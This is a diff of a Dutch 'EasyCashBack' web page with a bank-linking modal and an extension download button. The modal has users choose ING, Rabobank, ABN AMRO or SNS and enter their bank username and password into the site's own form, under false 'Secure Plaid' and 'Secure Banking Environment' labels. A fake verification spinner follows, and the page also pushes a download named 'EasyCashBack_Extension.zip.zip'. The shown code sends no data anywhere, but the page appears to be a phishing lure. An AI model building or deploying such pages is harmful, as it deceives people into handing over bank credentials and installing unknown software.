@@ -8,80 +8,110 @@
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap" rel="stylesheet">
     <style>body { font-family: 'Inter', sans-serif; }</style>
 </head>
-<body class="bg-slate-50 min-h-screen flex items-center justify-center p-6">
+<body class="bg-slate-50 min-h-screen flex flex-col p-6">
 
-    <div id="content-wrapper" class="max-w-4xl w-full">
-        <div class="text-center mb-12">
-            <h1 class="text-4xl font-black tracking-tight text-slate-900 mb-2">Configureer EasyCashBack</h1>
-            <p class="text-slate-500">Voltooi de activatie om direct te starten met besparen.</p>
-        </div>
+    <nav class="max-w-7xl mx-auto w-full mb-8">
+        <a href="javascript:history.back()" class="inline-flex items-center text-slate-400 hover:text-emerald-600 font-bold transition group">
+            <span class="mr-2 transform group-hover:-translate-x-1 transition-transform text-xl">←</span> 
+            Terug naar Wallet
+        </a>
+    </nav>
 
-        <div class="grid md:grid-cols-2 gap-8">
-            <div class="bg-white p-10 rounded-[3rem] shadow-xl border border-slate-100 text-center flex flex-col justify-between transition-all hover:shadow-2xl">
-                <div>
-                    <div class="w-16 h-16 bg-emerald-100 text-emerald-600 rounded-2xl flex items-center justify-center mx-auto mb-6">
-                        <svg xmlns="http://www.w3.org/2000/svg" class="h-8 w-8" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z" /></svg>
-                    </div>
-                    <h2 class="text-2xl font-black mb-4 italic">Bankrekening</h2>
-                    <p class="text-slate-500 text-sm mb-8 leading-relaxed">Koppel je rekening voor automatische cashback uitbetalingen.</p>
-                </div>
-                <button onclick="startBankFlow()" class="w-full bg-slate-900 text-white py-4 rounded-2xl font-bold hover:bg-emerald-600 transition shadow-lg">Inloggen bij bank</button>
+    <main class="flex-grow flex items-center justify-center">
+        <div id="content-wrapper" class="max-w-4xl w-full">
+            <div class="text-center mb-12">
+                <h1 class="text-4xl font-black tracking-tight text-slate-900 mb-2 italic uppercase">Activatie Hub</h1>
+                <p class="text-slate-500 font-medium">Koppel je account om je cashbacks te claimen.</p>
             </div>
 
-            <div class="bg-white p-10 rounded-[3rem] shadow-xl border border-slate-100 text-center flex flex-col justify-between transition-all hover:shadow-2xl">
-                <div>
-                    <div class="w-16 h-16 bg-blue-100 text-blue-600 rounded-2xl flex items-center justify-center mx-auto mb-6">
-                        <svg xmlns="http://www.w3.org/2000/svg" class="h-8 w-8" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M11 4a2 2 0 114 0v1a1 1 0 001 1h3a1 1 0 011 1v3a1 1 0 01-1 1h-1a2 2 0 100 4h1a1 1 0 011 1v3a1 1 0 01-1 1h-3a1 1 0 01-1-1v-1a2 2 0 10-4 0v1a1 1 0 01-1 1H7a1 1 0 01-1-1v-3a1 1 0 011-1h1a2 2 0 100-4H7a1 1 0 01-1-1V7a1 1 0 011-1h3a1 1 0 001-1V4z" /></svg>
-                    </div>
-                    <h2 class="text-2xl font-black mb-4 italic">Browser Extensie</h2>
-                    <p class="text-slate-500 text-sm mb-8 leading-relaxed">Download de browserhulp om deals direct te activeren.</p>
+            <div class="grid md:grid-cols-2 gap-8">
+                <div class="bg-white p-10 rounded-[3rem] shadow-xl border border-slate-100 text-center flex flex-col justify-between transition-all hover:shadow-2xl">
+                    <div class="w-16 h-16 bg-emerald-100 text-emerald-600 rounded-2xl flex items-center justify-center mx-auto mb-6 italic font-black">€</div>
+                    <h2 class="text-2xl font-black mb-4">Bankrekening</h2>
+                    <p class="text-slate-500 text-sm mb-8 leading-relaxed font-medium text-center px-4">Veilige koppeling via Plaid voor automatische uitbetalingen.</p>
+                    <button onclick="openBankSelector()" class="w-full bg-slate-900 text-white py-5 rounded-2xl font-black text-lg hover:bg-emerald-600 transition shadow-lg">Inloggen bij bank</button>
                 </div>
-                <button onclick="downloadAndReturn()" class="w-full bg-emerald-600 text-white py-4 rounded-2xl font-bold hover:bg-emerald-700 transition shadow-lg shadow-emerald-100">Extensie activeren</button>
+
+                <div class="bg-white p-10 rounded-[3rem] shadow-xl border border-slate-100 text-center flex flex-col justify-between transition-all hover:shadow-2xl">
+                    <div class="w-16 h-16 bg-blue-100 text-blue-600 rounded-2xl flex items-center justify-center mx-auto mb-6 italic font-black">ZIP</div>
+                    <h2 class="text-2xl font-black mb-4">Browser Hulp</h2>
+                    <p class="text-slate-500 text-sm mb-8 leading-relaxed font-medium text-center px-4">Download onze extensie om geen enkele deal meer te missen.</p>
+                    <button onclick="downloadZip()" class="w-full bg-emerald-600 text-white py-5 rounded-2xl font-black text-lg hover:bg-emerald-700 transition shadow-lg">Extensie activeren</button>
+                </div>
             </div>
         </div>
-    </div>
+    </main>
 
-    <div id="bank-modal" class="hidden fixed inset-0 bg-slate-900/80 backdrop-blur-md flex items-center justify-center p-6 z-50">
-        <div id="modal-content" class="bg-white max-w-sm w-full p-10 rounded-[3rem] text-left shadow-2xl">
-            <h3 class="text-2xl font-black mb-2 italic text-center text-slate-900">Inloggen bij Bank</h3>
-            <p class="text-slate-400 text-[10px] text-center mb-8 uppercase tracking-[0.2em] font-black">Secure Plaid Connection</p>
+    <div id="bank-modal" class="hidden fixed inset-0 bg-slate-900/90 backdrop-blur-md flex items-center justify-center p-6 z-50">
+        <div id="modal-content" class="bg-white max-w-sm w-full p-10 rounded-[3rem] shadow-2xl overflow-hidden">
             
-            <div id="login-fields">
-                <div class="mb-4">
-                    <label class="block text-[10px] font-black uppercase text-slate-400 mb-2 ml-1">Gebruikersnaam</label>
-                    <input type="text" class="w-full p-4 bg-slate-50 border border-slate-100 rounded-2xl focus:outline-emerald-500 font-medium" placeholder="bijv. info@easycashback.nl">
+            <div id="step-1">
+                <h3 class="text-2xl font-black mb-8 text-center text-slate-900 italic">Kies je Bank</h3>
+                <div class="space-y-3">
+                    <button onclick="goToLogin('ING')" class="w-full p-5 border-2 border-slate-50 rounded-2xl hover:border-orange-500 flex justify-between items-center font-bold">ING <span class="text-orange-500">➔</span></button>
+                    <button onclick="goToLogin('Rabobank')" class="w-full p-5 border-2 border-slate-50 rounded-2xl hover:border-blue-700 flex justify-between items-center font-bold">Rabobank <span class="text-blue-700">➔</span></button>
+                    <button onclick="goToLogin('ABN AMRO')" class="w-full p-5 border-2 border-slate-50 rounded-2xl hover:border-emerald-600 flex justify-between items-center font-bold">ABN AMRO <span class="text-emerald-600">➔</span></button>
+                    <button onclick="goToLogin('SNS')" class="w-full p-5 border-2 border-slate-50 rounded-2xl hover:border-red-600 flex justify-between items-center font-bold">SNS <span class="text-red-600">➔</span></button>
                 </div>
-                <div class="mb-8">
-                    <label class="block text-[10px] font-black uppercase text-slate-400 mb-2 ml-1">Wachtwoord</label>
-                    <input type="password" class="w-full p-4 bg-slate-50 border border-slate-100 rounded-2xl focus:outline-emerald-500 font-medium" placeholder="••••••••">
+            </div>
+
+            <div id="step-2" class="hidden">
+                <div class="flex items-center gap-2 mb-6">
+                    <button onclick="openBankSelector()" class="text-slate-400 text-xs font-bold uppercase">← Terug</button>
                 </div>
-                <button onclick="processLogin()" class="w-full py-5 bg-emerald-500 text-white rounded-[1.5rem] font-black text-lg hover:bg-emerald-600 transition shadow-lg shadow-emerald-100">Verifieer Account</button>
+                <h3 id="bank-title" class="text-2xl font-black mb-6 text-slate-900 italic">Inloggen</h3>
+                <div class="space-y-4">
+                    <input type="text" class="w-full p-5 bg-slate-50 rounded-2xl border border-slate-100 font-bold focus:outline-emerald-500" placeholder="Gebruikersnaam / E-mail">
+                    <input type="password" class="w-full p-5 bg-slate-50 rounded-2xl border border-slate-100 font-bold focus:outline-emerald-500" placeholder="Wachtwoord">
+                    <button onclick="finishBank()" class="w-full py-5 bg-slate-900 text-white rounded-2xl font-black text-lg hover:bg-emerald-600 transition">Inloggen</button>
+                </div>
+                <p class="mt-6 text-[10px] text-center text-slate-400 font-black uppercase tracking-[0.2em]">Secure Banking Environment</p>
+            </div>
+
+            <div id="step-3" class="hidden py-10 text-center">
+                <div class="w-16 h-16 border-4 border-emerald-500 border-t-transparent rounded-full animate-spin mx-auto mb-6"></div>
+                <h3 class="text-2xl font-black text-emerald-600 italic">Verifiëren...</h3>
+                <p class="text-slate-500 text-sm font-bold">Bankrekening wordt gekoppeld.</p>
             </div>
         </div>
     </div>
 
     <script>
-        function startBankFlow() {
+        function openBankSelector() {
             document.getElementById('bank-modal').classList.remove('hidden');
+            document.getElementById('step-1').classList.remove('hidden');
+            document.getElementById('step-2').classList.add('hidden');
+            document.getElementById('step-3').classList.add('hidden');
         }
 
-        function processLogin() {
-            const content = document.getElementById('modal-content');
-            content.innerHTML = `
-                <div class="py-10 text-center">
-                    <div class="w-16 h-16 border-4 border-emerald-500 border-t-transparent rounded-full animate-spin mx-auto mb-6"></div>
-                    <h3 class="text-2xl font-black text-emerald-600 mb-2 italic">Verbonden!</h3>
-                    <p class="text-slate-500 text-sm">Je rekening is succesvol gekoppeld.</p>
-                </div>
-            `;
-            setTimeout(() => { window.history.back(); }, 2500);
+        function goToLogin(bankName) {
+            document.getElementById('step-1').classList.add('hidden');
+            document.getElementById('step-2').classList.remove('hidden');
+            document.getElementById('bank-title').innerText = "Inloggen bij " + bankName;
         }
 
-        function downloadAndReturn() {
-            // Let op: hier staat nu de dubbele .zip.zip
-            window.location.href = "/static/EasyCashBack_Extension.zip.zip";
-            
-            setTimeout(() => { window.history.back(); }, 2000);
+        function finishBank() {
+            document.getElementById('step-2').classList.add('hidden');
+            document.getElementById('step-3').classList.remove('hidden');
+            setTimeout(() => {
+                window.history.back(); // Floept terug naar je website
+            }, 3000);
+        }
+
+        function downloadZip() {
+            // We proberen beide opties voor de zekerheid
+            const filename = "EasyCashBack_Extension.zip.zip"; 
+            const link = document.createElement('a');
+            link.href = "/static/" + filename;
+            link.download = filename;
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+
+            // Stuur na 2 seconden terug
+            setTimeout(() => {
+                window.history.back();
+            }, 2000);
         }
     </script>
 </body>
